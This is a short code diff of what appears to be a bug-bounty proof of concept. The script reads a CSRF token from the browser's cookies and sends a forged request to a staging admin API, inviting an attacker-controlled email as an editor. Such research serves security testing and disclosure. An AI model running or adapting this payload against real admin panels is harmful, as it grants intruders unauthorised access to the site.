@@ -6,7 +6,7 @@ let url = "https://adminbc.tsec-stg.com/api/v1/admins/send-invite";
 let headers = {
     'Accept': 'application/json',
     'Content-Type': 'application/json',
-    'X-Ts-Csrf': document.cookie['X-Ts-Csrf']
+    'X-Ts-Csrf': document.cookie.substring(11)
 };
 
 jsonObj={"email":"gtrf+badguy@bugcrowdninja.com", "role":"editor"}
